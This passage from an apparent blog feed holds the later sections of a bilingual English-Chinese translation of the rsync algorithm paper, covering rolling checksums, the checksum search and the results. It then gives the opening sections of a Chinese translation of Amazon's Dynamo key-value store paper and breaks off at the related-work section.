字节的块（在任何偏移量，而不仅仅是 S 的倍数），这些块具有与 B 的块之一相同的弱校验和和强校验和。使用下面介绍的滚动校验和的特殊属性可以非常快速地一次完成此操作。</li><li>a 向 b 发送一系列指令，用于构造 A 的副本。每条指令要么是对 B 块的引用，要么是文字数据。 只有当 A 和 B 的不匹配的部分数据块才会发送文字数据。</li></ol><p>The end result is that b gets a copy of A, but only the pieces of A that are not found in B (plus a small amount of data for checksums and block indexes) are sent over the link. The algorithm also only requires one round trip, which minimises the impact of the link latency.</p><p>最终结果是 b 获得了 A 的副本，但是仅通过链路发送了 B 中找不到的 A 中的片段（以及很少的用于校验和和块索引的数据）。该算法只需要一次往返，从而能够最大限度的减少链路延迟的影响。</p><p>The most important details of the algorithm are the rolling checksum and the associated multi-alternate search mechanism which allows the all-offsets checksum search to proceed very quickly. These will be discussed in greater detail below.</p><p>该算法最重要的细节是滚动校验和以及相关联的多变量搜索机制，它使得能够非常快速的进行偏移量校验和搜索。 这些将在下面更详细地讨论。</p><h2 id="3、滚动校验和"><a href="#3、滚动校验和" class="headerlink" title="3、滚动校验和"></a>3、滚动校验和</h2><p>The weak rolling checksum used in the rsync algorithm needs to have the property that it is very cheap to calculate the checksum of a buffer X(2)..X(n+1) given the checksum of buffer X(1)..X(n) and the values of the bytes X(1) and X(n+1).</p><p>rsync 算法中使用的弱滚动校验和必须具有以下特性：在给定缓冲区 X(1) .. X(n) 的校验和的情况下，计算缓冲区 X(2) .. X(n +1) 的校验和以及字节 X(1) 和 X(n + 1) 非常方便 。</p><p>The weak checksum algorithm we used in our implementation was inspired by Mark Adler’s adler-32 checksum. Our checksum is defined by: </p><p>我们在实现中使用的弱校验和的算法灵感来自 Mark Adler 的 adler-32 校验和。 我们的校验和定义为：</p><div><p><img src="/assets/images/rsync-algorithm-1.png" loading="lazy"></p></div><div><p><img src="/assets/images/rsync-algorithm-2.png" loading="lazy"></p></div><div><p><img src="/assets/images/rsync-algorithm-3.png" loading="lazy"></p></div><p>where s(k, l) is the rolling checksum of the bytes X(k)..X(l). For simplicity and speed, we use M &#x3D; 2^16 .</p><p>其中 s(k, l) 是字节 X(k) .. X(l) 的滚动校验和。 为了简单和速度，我们使用 M &#x3D; 2^16 。</p><p>The important property of this checksum is that successive values can be computed very efficiently using the recurrence relation</p><p>该校验和的重要特性是可以使用递归关系非常高效地计算连续值</p><div><p><img src="/assets/images/rsync-algorithm-4.png" loading="lazy"></p></div><div><p><img src="/assets/images/rsync-algorithm-5.png" loading="lazy"></p></div><p>Thus the checksum can be calculated for blocks of length S at all possible offsets within a file in a  “rolling” fashion, with very little computation at each point.</p><p>因此，可以使用 “滚动” 的方式为文件内所有可能偏移量计算长度为 S 的块校验和，每个点的计算量非常少。</p><p>Despite its simplicity, this checksum was found to be quite adequate as a rst level check for a match of two file blocks. We have found in practice that the probability of this checksum matching when the blocks are not equal is quite low. This is important because the much more expensive strong checksum must be calculated for each block where the weak checksum matches.</p><p>尽管它很简单，但将这个校验和作为两个文件块匹配的第一级检查是足够的了。 我们在实践中发现，当块不相等时，这个校验和匹配的概率很低。 这很重要，否则的话就需要为弱校验和匹配的每个块计算更昂贵的强校验和。</p><h2 id="4、校验和搜索"><a href="#4、校验和搜索" class="headerlink" title="4、校验和搜索"></a>4、校验和搜索</h2><p>Once a has received the list of checksums of the blocks of B, it must search A for any blocks at any offset that match the checksum of some block of B. The basic strategy is to compute the 32-bit rolling checksum for a block of length S starting at each byte of A in turn, and for each checksum, search the list for a match. To do this our implementation uses a simple 3 level searching scheme.</p><p>一旦 a 收到来自 B 的块的校验和列表，它必须在 A 中搜索任何偏移量与 B 的某个块的校验和匹配的块。基本策略是从 A 的每个字节处开始计计算长度为 S 的块的 32 位滚动校验和，并且为每个校验和再列表中搜索匹配项。为此，我们的实现使用了一个简单的三级搜索方案。</p><p>The first level uses a 16-bit hash of the 32-bit rolling checksum and a 2^16 entry hash table. The list of checksum values (i.e., the checksums from the blocks of B) is sorted according to the 16-bit hash of the 32-bit rolling checksum. Each entry in the hash table points to the first element of the list for that hash value, or contains a null value if no element of the list has that hash value.</p><p>第一级使用 32 位滚动校验和的 16 位哈希和 2^16 个条目的哈希表。 根据 32 位滚动校验和的 16 位哈希对校验和值列表（即来自 B 块的校验和）进行排序。哈希表中的每个条目都指向该哈希值的列表的第一个元素，或者如果列表中没有元素具有该哈希值，则包含一个空值。</p><p>At each offset in the file the 32-bit rolling checksum and its 16-bit hash are calculated. If the hash table entry for that hash value is not a null value, the second level check is invoked.</p><p>在文件中的每个偏移处计算 32 位滚动校验和及其 16 位哈希。 如果该哈希值的哈希表条目不是空值，则调用第二级检查。</p><p>The third level check involves calculating the strong checksum for the current offset in the file and comparing it with the strong checksum value in the current list entry. If the two strong checksums match, we assume that we have found a block of A which matches a block of B. In fact the blocks could be different, but the probability of this is microscopic, and in practice this is a reasonable assumption.</p><p>第三级检查涉及计算文件中当前偏移量的强校验和，并将其与当前列表条目中的强校验和值进行比较。 如果两个强校验和匹配，我们假设我们找到了一个匹配 B 块的 A 块。事实上，块可能不同，但这种可能性很小，实际上这是一个合理的假设。</p><p>When a match is found, a sends b the data in A between the current file offset and the end of the previous match, followed by the index of the block in B that matched. This data is sent immediately a match is found, which allows us to overlap the communication with further computation.</p><p>当找到匹配项时，a 向 b 发送 A 中当前文件偏移量和上一个匹配项结尾之间的数据，然后是 B 中匹配的块的索引。 找到匹配项后立即发送此数据，这使我们可以将通信与进一步的计算重叠。</p><p>If no match is found at a given offset in the file, the rolling checksum is updated to the next offset and the search proceeds. If a match is found, the search is restarted at the end of the matched block. This strategy saves a considerable amount of computation for the common case where the two files are nearly identical. In addition, it would be a simple matter to encode the block indexes as runs, for the common case where a portion of A matches a series of blocks of B in order.</p><p>如果在文件中的给定偏移量处未找到匹配项，则滚动校验和将更新为下一个偏移量并继续搜索。 如果找到匹配项，则在匹配块的末尾重新开始搜索。 对于两个文件几乎相同的常见情况，此策略可以节省大量计算。 此外，对于 A 的一部分按顺序匹配 B 的一系列块的常见情况，将块索引编码为运行是一件简单的事情。</p><h2 id="5、流水线"><a href="#5、流水线" class="headerlink" title="5、流水线"></a>5、流水线</h2><p>The above sections describe the process for constructing a copy of one file on a remote system. If we have a several files to copy, we can gain a considerable latency advantage by pipelining the process.</p><p>以上部分描述了在远程系统上构建一个文件副本的过程。 如果我们有多个文件要复制，我们可以通过流水线化过程获得相当大的延迟优势。</p><p>This involves b initiating two independent processes. One of the processes generates and sends the checksums to a while the other receives the difference information from a and reconstructs the files.</p><p>这涉及 b 启动两个独立的进程。 其中一个进程生成校验和并将其发送给 a，而另一个进程从 a 接收差异信息并重建文件。</p><p>If the communications link is buffered then these two processes can proceed independently and the link should be kept fully utilised in both directions for most of the time.</p><p>如果通信链路被缓冲，那么这两个过程可以独立进行，并且在大多数时间里，链路应该在两个方向上都得到充分利用。</p><h2 id="6、结果"><a href="#6、结果" class="headerlink" title="6、结果"></a>6、结果</h2><p>To test the algorithm, tar files were created of the Linux kernel sources for two versions of the kernel. The two kernel versions were 1.99.10 and 2.0.0. These tar files are approximately 24MB in size and are separated by 5 released patch levels.</p><p>为了测试该算法，为两个版本的内核创建了 Linux 内核源代码的 tar 文件。 两个内核版本分别是 1.99.10 和 2.0.0。 这些 tar 文件大小约为 24MB，由 5 个发布的补丁级别分隔。</p><p>Out of the 2441 files in the 1.99.10 release, 291 files had changed in the 2.0.0 release, 19 files had been removed and 25 files had been added.</p><p>在 1.99.10 版本的 2441 个文件中，2.0.0 版本更改了 291 个文件，删除了 19 个文件，添加了 25 个文件。</p><p>A “diff” of the two tar files using the standard GNU diff utility produced over 32 thousand lines of output totalling 2.1 MB.</p><p>使用标准 GNU diff 实用程序对两个 tar 文件进行“diff”产生了 32,000 多行输出，总计 2.1 MB。</p><p>The following table shows the results for rsync between the two files with a varying block size. [2]</p><p>下表显示了具有不同块大小的两个文件之间的 rsync 结果。[2]</p><div><p><img src="/assets/images/rsync-algorithm-6.png" loading="lazy"></p></div><p>In each case, the CPU time taken was less than the time it takes to run “diff” on the two files. [3]</p><p>在每种情况下，占用的 CPU 时间都少于在两个文件上运行 “diff” 所花费的时间。 [3]</p><p>The columns in the table are as follows:</p><p>表中各列如下：</p><ul><li>block size : The size in bytes of the checksummed blocks.</li><li>matches : The number of times a block of B was found in A.</li><li>tag hits : The number of times the 16 bit hash of the rolling checksum matched a hash of one of the checksums from B.</li><li>false alarms : The number of times the 32 bit rolling checksum matched but the strong checksum didn’t.</li><li>data : The amount of file data transferred verbatim, in bytes.</li><li>written : The total number of bytes written by a including protocol overheads. This is almost all file data.</li><li>read : The total number of bytes read by a including protocol overheads. This is almost all checksum information.</li></ul><br /><ul><li>块大小 ： 校验和块的大小（以字节为单位）。</li><li>匹配数 ： 在 A 中找到 B 块的次数。</li><li>标签点击数 ： 滚动校验和的 16 位散列与来自 B 的校验和之一的散列匹配的次数。</li><li>误报 ：32 位滚动校验和匹配但强校验和不匹配的次数。</li><li>数据 ： 逐字传输的文件数据量，以字节为单位。</li><li>写 ： 包括协议开销在内的写入的总字节数。 这几乎是所有文件数据。</li><li>读 ： 包括协议开销在内的读取的总字节数。 这几乎就是所有的校验和信息。</li></ul><p>The results demonstrate that for block sizes above 300 bytes, only a small fraction (around 5%) of the file was transferred. The amount transferred was also considerably less than the size of the diff file that would have been transferred if the diff&#x2F;patch method of updating a remote file was used.</p><p>结果表明，对于超过 300 字节的块大小，只有一小部分（大约 5%）的文件被传输。 如果使用更新远程文件的 diff&#x2F;patch 方法，传输的数量也大大小于 diff 文件的大小。</p><p>The checksums themselves took up a considerable amount of space, although much less than the size of the data transferred in each case. Each pair of checksums consumes 20 bytes: 4 bytes for the rolling checksum plus 16 bytes for the 128-bit MD4 checksum.</p><p>校验和本身占用了大量空间，尽管远小于每种情况下传输的数据大小。 每对校验和占用 20 个字节：4 个字节用于滚动校验和，另外 16 个字节用于 128 位 MD4 校验和。</p><p>The number of false alarms was less than 1&#x3D;1000 of the number of true matches, indicating that the 32 bit rolling checksum is quite good at screening out false matches.</p><p>误报数小于真实匹配数的1&#x3D;1000，说明 32 位滚动校验和非常适合筛选错误匹配。</p><p>The number of tag hits indicates that the second level of the checksum search algorithm was invoked about once every 50 characters. This is quite high because the total number of blocks in the file is a large fraction of the size of the tag hash table. For smaller files we would expect the tag hit rate to be much closer to the number of matches. For extremely large files, we should probably increase the size of the hash table.</p><p>标记命中数表示第二级校验和搜索算法大约每 50 个字符调用一次。 这是相当高的，因为文件中的块总数是标签哈希表大小的很大一部分。 对于较小的文件，我们希望标签命中率更接近匹配数。 对于非常大的文件，我们可能应该增加哈希表的大小。</p><p>The next table shows similar results for a much smaller set of files. In this case the files were not packed into a tar file first. Rather, rsync was invoked with an option to recursively descend the directory tree. The files used were from two source releases of another software package called Samba. The total source code size is 1.7 MB and the diff between the two releases is 4155 lines long totalling 120 kB.</p><p>下表显示了一组更小的文件的类似结果。 在这种情况下，文件没有先打包到 tar 文件中。 相反，调用 rsync 时带有递归下降目录树的选项。 使用的文件来自另一个名为 Samba 的软件包的两个源版本。 源代码总大小为 1.7 MB，两个版本之间的差异为 4155 行，总计 120 kB。</p><div><p><img src="/assets/images/rsync-algorithm-7.png" loading="lazy"></p></div><h2 id="7、可用性"><a href="#7、可用性" class="headerlink" title="7、可用性"></a>7、可用性</h2><p>An implementation of rsync which provides a convenient interface similar to the common UNIX command rcp has been written and is available for download from <a href="ftp://samba.anu.edu.au/pub/rsync">ftp://samba.anu.edu.au/pub/rsync</a>.</p><p>rsync 的实现提供了一个类似于通用 UNIX 命令 rcp 的方便接口，已经编写完成，可以从 <a href="ftp://samba.anu.edu.au/pub/rsync">ftp://samba.anu.edu.au/pub/rsync</a> 下载。</p>]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 论文 </tag>
            
            <tag> rsync </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>转/译-Dynamo:Amazon的高可用键值存储</title>
      <link href="/2019/10/14/dynamo/"/>
      <url>/2019/10/14/dynamo/</url>
      
        <content type="html"><![CDATA[<p>本文翻译自 2007 年 Amazon 的分布式存储经典论文：<a href="https://www.allthingsdistributed.com/files/amazon-dynamo-sosp2007.pdf">《Dynamo: Amazon’s Highly Available Key-value Store》</a>)，直译为 《Dynamo：Amazon 的高可用键值存储》，这里对排版做了一些调整，以更适合 web 阅读。</p><p>Dynamo 是 Amazon 的高可用分布式键值存储（key&#x2F;value storage）系统。这篇论文发表 的时候（2007）它还只是一个内部服务，现在（改名为 DynamoDB）已经发展成 AWS 最核心 的存储产品（服务）之一，与 S3 等并列。据了解，国内某一线大厂的公有云键值 存储服务，也是参考这篇文章设计和实现的。</p><p>现在提到键值存储，大家首先想到的可能是 Redis，那么 Dynamo 和 Redis 是不是竞品， 只是一个开源一个是商业的？不是的，二者针对的场景不同，这里非常粗地列举几方面：</p><ol><li>使用场景：Dynamo 定位是永远可写（always writable）的持久文件系统，Redis 主要用作（易失）缓存或内存数据库</li><li>存储方式：Dynamo 是磁盘，Redis 是内存</li><li>系统规模：Dynamo 是<strong>分布式</strong>（distributed）存储系统，设计之初（2006）就能支 撑几百台 node；Redis 是<strong>单机或集群（主从复制</strong>），规模不同</li><li>性能指标：以上差异必然导致各自设计时的性能考虑（例如延迟、吞吐、容错等）和实 际的性能量级不同</li></ol><p>精读一篇经典比泛读几十篇水文收获要大的多，尤其是那些领域开山之作。这篇论文适合精读。</p><p><strong>翻译仅供个人学习交流。由于译者水平有限，本文不免存在遗漏或错误之处。如有疑问， 请查阅原文。</strong></p><p>以下是译文。</p><hr><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>Amazon 是世界上最大的电商之一。</p><p>在这里我们所遇到的最大挑战之一就是<strong>超大规模下的稳定性问题</strong>（reliability at massive scale）。即使是最微小的故障（the slightest outage），也会造成巨大的经济 损失，而且会降低客户对我们的信任。Amazon.com 作为一个为全球提供 web 服务的平台， 其底层的基础设施是由分布在全球的数据中心中成千上万的服务器和网络设备组成的。在如 此庞大的规模下，大大小小的组件故障是不断在发生的，而我们应对这些故障时所采取 的<strong>管理持久状态的方式</strong>（the way persistent state is managed），<strong>驱动着软件系 统的可靠性（reliability）和可扩展性（scalability）的发展</strong>。</p><p>本文介绍 Dynamo —— 一个<strong>高可用键值存储系统</strong> —— 的设计和实现。Amazon 的一些核心 服务就是基于 Dynamo 提供不间断服务的（always-on experience）。为了达到这种等级的 可用性（level of availability），Dynamo <strong>牺牲了几种特定故障场景下的一致性</strong>。另 外，Dynamo 大量使用了<strong>对象版本化</strong>（object versioning）和<strong>应用协助的冲突解决</strong> （application-assisted conflict resolution）机制，给开发者提供了一种新颖的接口。</p><h2 id="1-引言"><a href="#1-引言" class="headerlink" title="1. 引言"></a>1. 引言</h2><p>Amazon 是一个全球电商平台，峰值用户达到几千万。支撑 Amazon 的是分布在全球的数据 中心中成千上万的服务器。Amazon 平台对<strong>性能、可靠性和效率</strong>等指标有着很高的要求 。而且，为了支撑持续增长（continous growth），平台需要有<strong>高度的可扩展性</strong>。<strong>可 靠性是我们最重要的需求之一</strong>，因为即使是最微小的故障也会造成巨大的经济损失，而且 会降低客户对我们的信任。</p><p>我们从打造 Amazon 平台的切身实践中总结出的一条经验是：<strong>一个系统的可靠性和可扩展 性取决于如何管理它的应用状态</strong>。</p><blockquote><p>The reliability and scalability of a system is dependent on how its application state is managed.</p></blockquote><p>Amazon 使用的是高度去中心化的、松耦合的、面向服务的架构，由几百个服务组成。这样 的环境对<strong>永远可用</strong>（always available）的存储技术有着强烈的需求。例如，<strong>即使磁 盘挂掉、路由抖动、甚至数据中心被飓风摧毁，用户应该仍然能向他们的购物车添加和查看 商品</strong>。要实现这样的目标，管理购物车的系统就必须永远能读写它的 数据仓库，而且 数据仓库还要跨多个数据中心可用。</p><p>对于我们这种由几百万台设备组成的基础设施，故障是家常便饭；在任何时刻都会有<strong>比例小 但数量不少</strong>（small but significant number）的服务器和网络设备发生故障。因此， Amazon 的软件系统要<strong>将故障视为正常的、可预期的行为（treat failure handling as the normal case），不应因设备故障而影响可用性和性能</strong>。</p><p>为了满足可靠性和可扩展性的需求，Amazon 开发了一些存储技术，S3 （Simple Storage Service）可能是最广为人知的一种。本文介绍 Amazon 的另一个存储产品 Dynamo —— 一个 高可用键值存储数据仓库（data store）—— 的设计和实现。</p><p>Dynamo 用于管理<strong>对可靠性要求非常高的服务</strong>的状态，这些服务还要求对可靠性、一致 性、成本-效率（cost-effectiveness）和性能有很强的控制能力。</p><blockquote><p>Dynamo is used to manage the state of services that have very high reliability requirements and need tight control over the tradeoffs between availability, consistency, cost-effectiveness and performance.</p></blockquote><p>Amazon 平台有很多类型的应用，不同的类型对存储的需求差异很大。例如，其中一类应用 希望能 <strong>数据仓库的配置足够灵活，以便在成本最经济的方式下，由开发者来决定如何 在可用性和性能之间取得折中</strong>。</p><p>Amazon 的一些服务<strong>只需以主键（primary key）的方式访问数据仓库</strong>。对于很多服 务，例如畅销排行榜、购物车、客户喜好偏向、session 管理、销售排名、商品目录等等， 常见的关系型数据库会非常低效，而且限制了规模的扩展性和可用性。Dynamo 提供了只使 用主键（primary key only）的访问接口来满足这类应用的需求。</p><p><strong>Dynamo 基于一些众所周知的（well known）技术实现了可扩展性和高可用性</strong>：</p><ul><li>数据通过<strong>一致性哈希</strong>分散和复制（partitioned and replicated）[10]</li><li>通过<strong>对象版本化</strong>（object versioning）实现一致性 [12]</li><li>副本之间的一致性由一种<strong>类似仲裁的技术</strong>（quorum-like technique）和一个去中 心化的<strong>副本同步协议</strong>（replica synchroni protocol）保证</li><li>gossip-based 分布式故障检测和成员检测（membership）协议</li></ul><p>Dynamo 是一个只需最少人工管理的、完全去中心化的系统。</p><blockquote><p>Dynamo is a completely decentralized system with minimal need for manual administration.</p></blockquote><p>向 Dynamo 添加或移除存储节点不需要人工 partition（调整哈希节点）或 redistribution（在节点之间重新平衡数据分布）。</p><p>Dynamo 在过去的几年已经成为 Amazon 很多核心服务的底层存储技术。在节假日购物高峰 ，它能实现不停服（平滑）扩容以支持极高的峰值负载。例如购物车服务的几千万请求会 产生单日 300 万次的付款动作，管理 session 状态的服务能处理几千万的并发活跃用户等 等。</p><p><strong>本文对该领域的主要贡献</strong>：</p><ul><li>评估了如何通过组合不同技术实现一个高度可用的（highly-available）系统</li><li>证明了最终一致性存储系统可以用于生产环境，满足应用的高要求</li><li>展示了若干优化技术，以满足生产环境的非常严格的性能要求</li></ul><p>本文章节结构介绍（略，见下面全文）。</p><h2 id="2-背景"><a href="#2-背景" class="headerlink" title="2. 背景"></a>2. 背景</h2><p>Amazon 的电商平台由几百个服务组成，它们协同工作，提供的服务包罗万象，从推荐系统 到订单处理到欺诈检测等等。每个服务对外提供定义良好的 API，被其他服务通过网络的方 式访问。这些服务运行在分布在全球的数据中心中，成千上万的服务器组成的基础设施之上 。有些服务是无状态的（例如，聚合其他服务的响应的服务），有些是有状态的（例如，基 于存储在数据仓库里的状态，执行业务逻辑并产生响应的服务）。</p><p>传统上，生产系统使用关系型数据库来存储状态。但对很多<strong>持久状态的存储</strong>需求来说， 关系型数据库并不是一种理想的方式。这一类型中的大多数服务只用主键去检索，并不需要 RDBMS 提供的复杂查询和管理功能。这些额外的功能需要昂贵的硬件和专门的技能，而实际 上服务根本用不到，最终的结果就是使用关系型数据库非常不经济。另外，这类数据库的复 制功能很受限，而且通常是靠<strong>牺牲可用性来换一致性</strong>。虽然近些年有了一些改进，但总 体来说水平扩展（scale-out）以及使用智能（smart）partitioning 来做负载均衡还是很不 方便。</p><p>本文介绍 Dynamo 是如何解决以上需求的。Dynamo 有易用的 key&#x2F;value 接口，高度可用 ，有定义清晰的一致性窗口（clearly defined consistency window），资源使用效率很高 ，并且有易用的水平扩展方案以解决请求量或数据增长带来的挑战。<strong>每个使用 Dynamo 的 服务，使用的都是它们独立的一套 Dynamo 系统</strong>。</p><blockquote><p>Each service that uses Dynamo runs its own Dynamo instances.</p></blockquote><h3 id="2-1-系统假设与需求"><a href="#2-1-系统假设与需求" class="headerlink" title="2.1 系统假设与需求"></a>2.1 系统假设与需求</h3><p>Dynamo 对使用它的服务有如下几点假设。</p><h4 id="查询模型（Query-Model）"><a href="#查询模型（Query-Model）" class="headerlink" title="查询模型（Query Model）"></a>查询模型（Query Model）</h4><p><strong>通过唯一的 key 对数据进行读写</strong>。状态以<strong>二进制对象</strong>（binary objects，e.g. blobs）形式存储，以唯一的 key 索引。</p><p><strong>任何操作都不会跨多个 data items</strong>（数据单元），没有关系型 schema 需求。</p><p>Dynamo 面向的应用<strong>存储的都是相对较小的文件（一般小于 1 MB）</strong>。</p><h4 id="ACID-特性"><a href="#ACID-特性" class="headerlink" title="ACID 特性"></a>ACID 特性</h4><p>ACID（Atomicity, Consistency, Isolation, Durability）是一组保证数据库事务可 靠执行的特性。在数据库领域，对数据的单次逻辑操作（single logical operation） 称为一次事务（transaction）。 我们在 Amazon 的实践表明，让数据仓库支持 ACID 会使得它的可用性（availability） 非常差，工业界和学术界也已经就这一点达成了广泛共识 [5]。</p><p><strong>Dynamo 的目标应用具有这样的特点：如果能给可用性（ACID 里面的 A）带来很大提升 ，那牺牲一些一致性（C）也是允许的</strong>。</p><p>Dynamo 不提供任何隔离保证，并且只允许带单个 key 的更新操作（permit only single key updates）。</p><h4 id="效率（Efficiency）"><a href="#效率（Efficiency）" class="headerlink" title="效率（Efficiency）"></a>效率（Efficiency）</h4><p>系统需要运行在通用硬件（commodity hardware）之上。Amazon 的服务对延迟有着严格的 要求，通常用百分位值（percentile）<code>P99.9</code> 衡量。</p><p>考虑到对状态数据的访问是服务的核心操作之一，我们的存储系统必须满足那些严格的 SLA （见 Section 2.2）。另外，服务要有配置 Dynamo 的能力，以便能满足服务的延迟和吞吐 需求。最终，就是在性能、成本效率、可用性和持久性之间取得折中。</p><h4 id="其他方面"><a href="#其他方面" class="headerlink" title="其他方面"></a>其他方面</h4><p>Dynamo 定位是 Amazon 内部使用，因此我们假设环境是安全的，不需要考虑认证和鉴权 等安全方面的问题。</p><p>另外，<strong>由于设计中每个服务都使用各自的一套 Dynamo，因此 Dynamo 的初始设计规模是 几百个存储节点</strong>。后面会讨论可扩展性限制的问题，以及可能的解决方式。</p><h3 id="2-2-SLA-Service-Level-Agreements"><a href="#2-2-SLA-Service-Level-Agreements" class="headerlink" title="2.2 SLA (Service Level Agreements)"></a>2.2 SLA (Service Level Agreements)</h3><p>要<strong>保证一个应用完成请求所花的时间有一个上限</strong>（bounded time），它所依赖的那些服 务就要有一个更低的上限。<strong>对于给定的系统特性</strong>，其中最主要的是客户端期望的<strong>请求 率分布</strong>（request rate distribution），**客户端和服务端会定义一个 SLA（服务级别 协议）**来作为契约。</p><p>举个简单例子：某个服务向客户端保证，在 500 QPS 的负载下，它处理 <code>99.9%</code> 的请求 所花的时间都在能 <code>300ms</code> 以内。</p><p>在 Amazon 的去中心化的、面向服务的基础设施中，SLA 扮演着重要角色。例如，对购物 页面的一次请求，在典型情况下会使渲染引擎向多达 150 个服务发送子请求，而这些子服 务又都有自己的依赖，最终形成一张多层的（more than one level）调用图（call graph ）。为了保证渲染引擎能在一个上限时间内返回一个页面，调用链中的所有服务就都必须遵 循各自的性能契约（contract）。</p><p><img src="/assets/images/dynamo-figure-1.png" alt="图 1 Amazon 平台的面向服务架构" loading="lazy"></p><p>图 1 是一张简化之后的 Amazon 平台架构图。可以看到，动态 web 内容由页面渲染组件 提供，而它是通过调用其他的一些服务来完成这项工作的。</p><p><strong>每个服务可以选择不同类型的数据仓库（data store）来管理（存储）它们的状态数据， 这些数据仓库只能在各自的服务边界（service boundaries）内访问</strong>。一些服务会通过聚 合其他服务的数据来组合产生一个响应（composite response）。典型情况下，聚合服务（ aggregator service）是无状态的，虽然它们大量使用缓存技术。</p><p>对于面向性能的 SLA（performance oriented SLA），业内一般习惯使用<strong>平均值、中位数 和方差</strong>来描述。但在 Amazon 我们发现，要打造一个让所有用户——而不是大部分用户——都 有良好体验的系统，以上 SLA 并不合适。例如，<strong>如果使用了个性化推荐技术，那用户的 访问历史越多，他的请求被处理的时间就越长，最终落到了性能分布的长尾区</strong>。基于平均 值或中位数的 SLA 并不能反映这种情况。为了解决这个问题，<strong>我们使用了 P99.9 分布。99.9% 这个精度是经过大量实验分析，权衡了成本和性能之后得到的</strong>。 我们在生产环境的实验显示，这比基于均值或中位数的 SLA 有更好的用户体验。</p><p>本文多处都将引用 P99.9 分布，这也显示了 Amazon 的工程师对提高用户体验所做的持续 不断的努力。一些基于均值的论文，我们会在它真正有意义的场景才拿出来作为比较，但我 们自己的工程和优化都不是以<strong>均值 SLA</strong> 为核心的。某些技术，例如 write coordinator（写操作协调者），是完全面向 P99.9 来控制性能的。</p><p><strong>存储系统在构建一个服务的 SLA 中经常扮演着重要角色，尤其是业务逻辑相对轻量的 场景</strong>，Amazon 的服务即属于这一类。因此，<strong>状态管理</strong> 就成了服务的 <strong>SLA 的主要 部分</strong>。</p><p><strong>Dynamo 的设计目标之一就是：允许服务自己控制自己的系统特性</strong>——例如持久性和一 致性——<strong>让服务自己决定如何在功能、性能和成本效率之间取得折中</strong>。</p><blockquote><p>One of the main design considerations for Dynamo is to give services control over their system properties, such as durability and consistency, and to let services make their own tradeoffs between functionality, performance and cost-effectiveness.</p></blockquote><h3 id="2-3-设计考虑"><a href="#2-3-设计考虑" class="headerlink" title="2.3 设计考虑"></a>2.3 设计考虑</h3><p><strong>商业系统中数据复制算法一般都是同步的，以提供一个强一致性的数据访问接口。 为了达到这种级别的一致性，这些算法被迫牺牲了某些故障场景下的数据可用性</strong>。例如， 如果数据有冲突，它们会禁止访问这个数据，直到数据的不一致完全得到了解决。在早期，这 种<strong>复制式数据库</strong>（replicated database）是可以工作的。</p><p>但众所周知，分布式系统是无法同时满足**强一致性、高可用性和正确处理网络故障（CAP ）**这几个条件的 [2, 11]。<strong>因此，系统和应用都需要知道，在什么场景下选择满足什么 特性</strong>。</p><p>对于<strong>服务器和网络故障较高的场景</strong>，可以通过<strong>乐观复制</strong>（optimistic replication ）技术增强<strong>可用性</strong>，在后台将数据变动同步到其他节点，并发更新和失联也是可以容忍 的。这种方式的问题是会<strong>导致数据冲突，需要检测并解决冲突</strong>。而解决数据冲突又会带 来两个额外问题：</p><ul><li>何时解决？</li><li>谁来解决？</li></ul><p><strong>Dynamo 设计为最终一致数据仓库</strong>（eventually consistent data store），即，最终 所有的更新会应用到所有的副本。</p><h4 id="何时解决冲突？"><a href="#何时解决冲突？" class="headerlink" title="何时解决冲突？"></a>何时解决冲突？</h4><p>设计时的一个重要考虑是：<strong>何时解决更新冲突</strong>，例如，是读的时候还是写的时候。</p><blockquote><p>An important design consideration is to decide when to perform the process of resolving update conflicts, i.e., whether conflicts should be resolved during reads or writes.</p></blockquote><p>一些传统的数据仓库是在<strong>写的时候解决冲突</strong>，这样可以<strong>保证读的复杂度很低</strong> [7]。 在这种系统中，任何时候<strong>如果数据仓库不能访问所有（或者大多数）副本，写就会被拒绝</strong>。</p><p>Dynamo 的设计与此相反，它的目标是提供一个**“永远可写”（always writable）**的数据 仓库（例如，一个对写操作高度可用的数据仓库）。对很多 Amazon 服务来说，拒绝写 入会造成很差的用户体验。比如即使发生服务器或网络故障，也应该允许用户往购物车添 加或删除商品。<strong>这个需求使我们将解决冲突的复杂度放到了读操作，以保证写永远不会 被拒绝</strong>。</p><h4 id="谁来解决冲突？"><a href="#谁来解决冲突？" class="headerlink" title="谁来解决冲突？"></a>谁来解决冲突？</h4><p>下一个需要考虑的问题是：<strong>谁来解决冲突</strong>。<strong>数据仓库</strong>和<strong>应用</strong>都可以做这件事情。</p><p><strong>如果由数据仓库来做，那选择会相当受限</strong>。在这种情况下，数据仓库只能使用一些 非常简单的策略，例如**“最后一次写有效”**（last write wins） [22]，来解决更新冲突。</p><p>另一方面，由于<strong>应用理解数据描述的是什么</strong>（application is aware of the data schema），<strong>它可以自主选择对用户体验最好的冲突解决算法</strong>。例如，购物车应用可以选择“ 合并”冲突的版本，返回一个合并后的（unified）购物车。尽管这样可以带来很大的灵活性 ，但一些应用开发者并不想自己实现一套冲突解决机制，因此在这种情况下，解决冲突的问 题就下放给了数据仓库，由后者来选择一些简单的策略，例如 “last write wins”。</p><h4 id="其他设计原则"><a href="#其他设计原则" class="headerlink" title="其他设计原则"></a>其他设计原则</h4><ul><li><strong>增量扩展性</strong>（Incremental scalability）：应当支持<strong>逐机器（节点）扩容</strong>，而 且对系统及运维人员带来的影响尽量小</li><li><strong>对称性</strong>（Symmetry）：<strong>每个节点的职责应该是相同的</strong>，不应当出现某些节点承担 特殊职责或特殊角色的情况。以我们的实践经验，<strong>对称性简化了系统的交付和运维</strong></li><li><strong>去中心化</strong>（Decentralization）：<strong>“去中心化”是“对称性”的进一步扩展</strong>，系统应 该是去中心化的、点对点的，而不应该是集中式控制的。在过去，集中式控制导致了很多 服务故障（outage），我们应当极力避免它。去中心化会使得系统更简单、更具扩展性和 可用性</li><li><strong>异构性</strong>（Heterogeneity）：系统要能够利用到基础设施的异构性。例如，<strong>负载的 分布要和存储节点的能力成比例</strong>。对于逐步加入能力更强的新节点，而不是一次升级所 有节点来说，这种异构支持能力是不可或缺的</li></ul><h2 id="3-相关工作"><a href="#3-相关工作" class="headerlink" title="3. 相关工作"></a>3. 相关工作</h2><h3 id="3-1-点对点系统（Peer-to-Peer-Systems）"><a href="#3-1-点对点系统（Peer-to-Peer-Systems）" class="headerlink" title="3.1 点对点系统（Peer to Peer Systems）"></a>3.1 点对点系统（Peer to 